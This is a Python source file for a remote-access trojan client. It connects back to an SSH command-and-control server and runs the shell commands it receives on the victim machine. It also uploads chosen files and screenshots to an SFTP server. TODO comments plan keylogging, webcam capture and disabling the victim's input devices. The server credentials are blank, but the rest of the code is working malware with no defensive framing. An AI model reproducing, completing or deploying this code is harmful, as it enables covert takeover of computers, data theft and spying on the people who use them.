import paramiko
import subprocess
from PIL import ImageGrab
import time


# TODO: keylogger, webcam, disable mouse/keyboard
# TODO: screenshot indexing

C2_SERVER_ADDR = ''
C2_SERVER_SSH_USERNAME = ''
C2_SERVER_SSH_PASSWORD = ''

SFTP_SERVER_ADDR = ''
SFTP_SERVER_PORT = 22
SFTP_SERVER_USERNAME = ''
SFTP_SERVER_PASSWORD = ''
SFTP_SERVER_UPLOAD_DIR = ''


def screenshot():
    try:
        im = ImageGrab.grab()
        im.save('screenshot.png')
    except Exception as e:
        return str(e)
    return sftp_command('screenshot.png', 'screenshot')


def sftp_command(local_path, name):
    try:
        transport = paramiko.Transport((SFTP_SERVER_ADDR, SFTP_SERVER_PORT))
        transport.connect(username=SFTP_SERVER_USERNAME, password=SFTP_SERVER_PASSWORD)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, SFTP_SERVER_UPLOAD_DIR + name)
        sftp.close()
        transport.close()
        return '[+] Done'
    except Exception as e:
        return str(e)


def connect_to_c2server():
    connected = False
    while not connected:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(C2_SERVER_ADDR, username=C2_SERVER_SSH_USERNAME, password=C2_SERVER_SSH_PASSWORD)
            chan = client.get_transport().open_session()
            chan.send('Hey I am connected :) ')
            print(chan.recv(1024).decode("utf-8"))
            connected = True
            return chan, client
        except Exception as e:
            print("[-] Unable to connect to c2 server - retrying in 10 sec...")
            time.sleep(10)
            connected = False


def handle_communication(chan):
    connected = True
    while connected:
        cmd = chan.recv(1024).decode("utf-8")
        try:
            if 'grab' in cmd:
                grab, name, path = cmd.split('*')
                response = sftp_command(path, name)
            elif 'getscreen' in cmd:
                chan.send(screenshot())
            elif 'quit' in cmd:
                response = 'Goodbye'
            else:
                response = subprocess.check_output(cmd, shell=True)
            if response == '':
                response = 'No output'
            chan.send(response)
        except Exception as e:
            try:
                chan.send(str(e))
            except Exception as e:
                print("[-] Connection lost.")
                connected = False


def main():
    while True:
        chan, client = connect_to_c2server()
        handle_communication(chan)


if __name__ == "__main__":
    main()
